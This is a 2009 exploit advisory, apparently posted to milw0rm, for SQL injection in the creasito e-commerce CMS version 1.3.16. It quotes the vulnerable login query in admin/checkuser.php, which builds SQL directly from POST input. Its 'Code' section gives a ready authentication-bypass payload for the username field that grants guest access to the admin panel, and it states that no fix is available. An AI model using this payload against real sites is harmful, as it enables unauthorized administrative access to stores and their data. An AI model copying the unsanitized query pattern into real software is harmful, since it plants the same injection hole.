@@ -1,0 +1,76 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: creasito e-commerce content manager
+[+] Version: 1.3.16
+[+] Website: http://creasito.bloghosteria.com
+
+[+] Bugs: [A] Authentication Bypass
+
+[+] Exploitation: Remote
+[+] Date: 20 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+This cms is entirely vulnerable to SQL Injection.
+I decided to post authentication bypass security
+flaw only.
+
+- [A] Authentication Bypass
+
+[-] Risk: medium
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: admin/checkuser.php, checkuser.php
+
+SQL Injection bug allows a guest to bypass the
+authentication system. The following is the
+vulnerable code:
+
+...
+
+$username = $_POST['username'];
+
+...
+
+$sql = mysql_query("SELECT * FROM amministratore WHERE
+username='$username' AND password='$password' AND activated='1'");
+
+...
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Authentication Bypass
+
+Username: -1' OR '1'='1'#
+Password: foo
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-20]
